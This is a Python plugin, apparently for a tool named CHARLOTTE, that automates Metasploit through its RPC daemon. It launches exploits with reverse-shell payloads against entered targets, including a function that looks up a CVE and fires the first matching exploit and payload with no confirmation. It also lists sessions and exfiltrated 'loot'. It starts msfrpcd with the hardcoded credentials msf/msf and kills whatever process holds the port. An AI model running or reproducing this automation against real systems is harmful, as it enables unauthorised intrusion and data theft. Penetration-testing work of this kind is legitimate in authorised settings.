# ******************************************************************************************
# metasploit_plugin.py
# CHARLOTTE plugin for interacting with Metasploit RPC
# Detects port conflicts, safely terminates msfrpcd, and falls back to alternate ports
# ******************************************************************************************

import os
import subprocess
import time
import socket
import psutil
from pymetasploit3.msfrpc import MsfRpcClient

# Configuration
DEFAULT_PORT = 55553
FALLBACK_PORTS = [55554, 55555, 55556]
MSF_USER = "msf"
MSF_PASS = "msf"
MSF_HOST = "127.0.0.1"

# ==========================================================================================
# FUNCTION: is_port_in_use()
# Checks if a given port is actively being used
# ==========================================================================================
def is_port_in_use(port, host='127.0.0.1'):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex((host, port)) == 0

# ==========================================================================================
# FUNCTION: get_pid_using_port()
# Returns the PID of the process using the specified port
# ==========================================================================================
def get_pid_using_port(port):
    for conn in psutil.net_connections(kind='tcp'):
        if conn.laddr.port == port and conn.status == psutil.CONN_LISTEN:
            return conn.pid
    return None

# ==========================================================================================
# FUNCTION: kill_process()
# Attempts to terminate a process by PID
# ==========================================================================================
def kill_process(pid):
    try:
        p = psutil.Process(pid)
        p.terminate()
        p.wait(timeout=5)
        print(f"[+] Killed process using port: {pid}")
    except Exception as e:
        print(f"[!] Failed to kill process using port {pid}: {e}")

# ==========================================================================================
# FUNCTION: find_available_port()
# Returns DEFAULT_PORT if free, else kills existing process or falls back to alternates
# ==========================================================================================
def find_available_port():
    if not is_port_in_use(DEFAULT_PORT):
        return DEFAULT_PORT
    pid = get_pid_using_port(DEFAULT_PORT)
    if pid:
        print(f"[!] Port {DEFAULT_PORT} is in use by PID {pid}. Attempting to terminate...")
        kill_process(pid)
        time.sleep(2)
        if not is_port_in_use(DEFAULT_PORT):
            print(f"[+] Port {DEFAULT_PORT} is now free.")
            return DEFAULT_PORT
    for port in FALLBACK_PORTS:
        if not is_port_in_use(port):
            print(f"[+] Falling back to available port {port}")
            return port
    raise RuntimeError("[-] No available ports for Metasploit RPC.")

# ==========================================================================================
# FUNCTION: start_msfrpcd()
# Launches Metasploit RPC daemon using Ruby
# ==========================================================================================
def start_msfrpcd(port):
    ruby_path = r"C:\metasploit-framework\embedded\bin\ruby.exe"
    msfrpcd_path = r"C:\metasploit-framework\embedded\framework\msfrpcd"
    if not (os.path.exists(ruby_path) and os.path.exists(msfrpcd_path)):
        print("[!] Required msfrpcd paths not found.")
        return False

    print(f"[*] Starting msfrpcd on port {port}...")
    try:
        subprocess.Popen([
            ruby_path, msfrpcd_path,
            "-U", MSF_USER,
            "-P", MSF_PASS,
            "-a", MSF_HOST,
            "-p", str(port),
            "-S"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(5)
        return True
    except Exception as e:
        print(f"[!] Failed to launch msfrpcd: {e}")
        return False

# ==========================================================================================
# FUNCTION: connect_to_msf()
# Attempts to connect to the running RPC server with credentials
# ==========================================================================================
def connect_to_msf(port):
    try:
        client = MsfRpcClient(MSF_PASS, server=MSF_HOST, port=port)
        print("[+] Connected to Metasploit RPC!")
        return client
    except Exception as e:
        print(f"[!] Failed to connect to Metasploit RPC: {e}")
        return None

# ==========================================================================================
# FUNCTION: interactive_exploit_demo()
# Runs a simple demo allowing user to launch an exploit manually
# ==========================================================================================
def interactive_exploit_demo(client):
    print("\n[+] Available Exploits:\n")
    exploits = client.modules.exploits
    for i, exploit in enumerate(exploits[:10]):
        print(f"{i + 1}. {exploit}")

    print("\n[+] Search for 'tomcat':")
    tomcat_exploits = [e for e in exploits if 'tomcat' in e.lower()]
    print(tomcat_exploits)

    print("\n[+] Running example exploit:")
    exploit_name = input("Which exploit would you like to run? (e.g., multi/http/tomcat_mgr_deploy): ").strip()
    if not exploit_name:
        print("[!] Exploit name is required.")
        return

    rhost = input("Enter RHOST (target IP): ").strip()
    lhost = input("Enter LHOST (local IP for reverse shell): ").strip()
    lport = input("Enter LPORT (local port for reverse shell): ").strip()
    if not (rhost and lhost and lport):
        print("[!] RHOST, LHOST, and LPORT are required.")
        return

    try:
        exploit = client.modules.use('exploit', exploit_name)
        compatible_payloads = exploit.compatible_payloads
        if not compatible_payloads:
            print("[!] No compatible payloads found for this exploit.")
            return

        print("\n[+] Compatible Payloads:")
        for i, p in enumerate(compatible_payloads):
            print(f"{i + 1}. {p}")

        payload_input = input("Select a payload (press Enter to auto-select first): ").strip()
        payload_name = payload_input if payload_input else compatible_payloads[0]
        print(f"[+] Selected payload: {payload_name}")

        payload = client.modules.use('payload', payload_name)
        exploit['RHOSTS'] = rhost
        payload['LHOST'] = lhost
        payload['LPORT'] = lport

        job_id = exploit.execute(payload=payload)
        print(f"[+] Exploit launched. Job ID: {job_id}")
    except Exception as e:
        print(f"[!] Error during exploitation: {e}")

# ==========================================================================================
# FUNCTION: auto_execute_exploit()
# Automatically executes an exploit with given parameters
# ==========================================================================================
def auto_execute_exploit(client, exploit_name, rhost, lhost, lport):
    try:
        exploit = client.modules.use('exploit', exploit_name)
        compatible_payloads = exploit.compatible_payloads
        if not compatible_payloads:
            print("[!] No compatible payloads found.")
            return
        payload = client.modules.use('payload', compatible_payloads[0])
        exploit['RHOSTS'] = rhost
        payload['LHOST'] = lhost
        payload['LPORT'] = lport
        job_id = exploit.execute(payload=payload)
        print(f"[+] Auto-exploit launched. Job ID: {job_id}")
    except Exception as e:
        print(f"[!] Auto-exploit error: {e}")

# ==========================================================================================
# FUNCTION: get_active_jobs()
# Returns active jobs (can be filtered by exploit name if needed)
# ==========================================================================================
def get_active_jobs(client):
    jobs = client.jobs.list
    print(f"[+] Active Jobs: {jobs}")
    return jobs

# ==========================================================================================
# FUNCTION: list_sessions()
# Lists all active sessions (interactive shells, Meterpreter, etc.)
# ==========================================================================================
def list_sessions(client):
    sessions = client.sessions.list
    if not sessions:
        print("[-] No active sessions found.")
        return
    print("[+] Active Sessions:")
    for sid, info in sessions.items():
        print(f"Session {sid}: {info['session_type']} on {info['target_host']}")
    return sessions

# ==========================================================================================
# FUNCTION: list_loot()
# Lists loot files (exfiltrated data, hashes, etc.)
# ==========================================================================================
def list_loot(client):
    try:
        loot = client.loots.list
        if not loot:
            print("[-] No loot data available.")
            return
        print(f"[+] {len(loot)} loot items found:")
        for l in loot:
            print(f" - {l['name']} | {l['type']} | {l['host']} | {l['data'][:50]}")
        return loot
    except Exception as e:
        print(f"[!] Failed to list loot: {e}")
        return []


# ==========================================================================================
# FUNCTION: search_exploit_by_cve()
# Searches for Metasploit modules that map to a given CVE ID
# ==========================================================================================
def search_exploit_by_cve(client, cve_id):
    print(f"[*] Searching for exploit modules for {cve_id}...")
    try:
        results = client.modules.search(cve_id)
        exploits = [r for r in results if r['type'] == 'exploit']
        if exploits:
            print(f"[+] Found {len(exploits)} exploit(s) for {cve_id}:")
            for i, exploit in enumerate(exploits):
                print(f"{i + 1}. {exploit['fullname']} ({exploit['rank']})")
            return exploits
        else:
            print("[-] No exploits found for this CVE.")
            return []
    except Exception as e:
        print(f"[!] Failed to search for CVE {cve_id}: {e}")
        return []
    
# ==========================================================================================
# FUNCTION: execute_chained_cve()
# Called by CHARLOTTE when chaining from a CVE-based module
# ==========================================================================================
def execute_chained_cve(client, cve_id, rhost, lhost, lport):
    print(f"[*] Executing exploit for chained CVE: {cve_id}")
    exploits = search_exploit_by_cve(client, cve_id)
    if not exploits:
        print("[-] No exploits found for this CVE.")
        return

    chosen = exploits[0]["fullname"]
    print(f"[+] Selected exploit: {chosen}")
    
    try:
        exploit = client.modules.use('exploit', chosen)
        compatible_payloads = exploit.compatible_payloads
        if not compatible_payloads:
            print("[-] No compatible payloads found.")
            return
        
        payload = client.modules.use('payload', compatible_payloads[0])
        exploit['RHOSTS'] = rhost
        payload['LHOST'] = lhost
        payload['LPORT'] = lport
        job_id = exploit.execute(payload=payload)
        
        print(f"[+] Exploit launched. Job ID: {job_id}")
        print("[*] Checking active jobs and loot...")
        get_active_jobs(client)
        list_sessions(client)
        list_loot(client)

        return {
            "status": "success",
            "cve": cve_id,
            "exploit": chosen,
            "payload": payload['name'],
            "job_id": job_id
        }

    except Exception as e:
        print(f"[!] Failed to execute chained CVE exploit: {e}")
        return {
            "status": "error",
            "cve": cve_id,
            "error": str(e)
        }

# ==========================================================================================
# MAIN ENTRY POINT
# ==========================================================================================
if __name__ == "__main__":
    print("[*] Attempting to start Metasploit RPC server...")
    selected_port = find_available_port()

    if start_msfrpcd(selected_port):
        client = connect_to_msf(selected_port)
    else:
        print("[!] Could not launch Metasploit RPC service.")
        client = None

    if client:
        interactive_exploit_demo(client)
    else:
        print("[!] Metasploit RPC client is not connected.")
    print("[*] Metasploit interaction complete.")

# ==========================================================================================
# END OF FILE
# ==========================================================================================
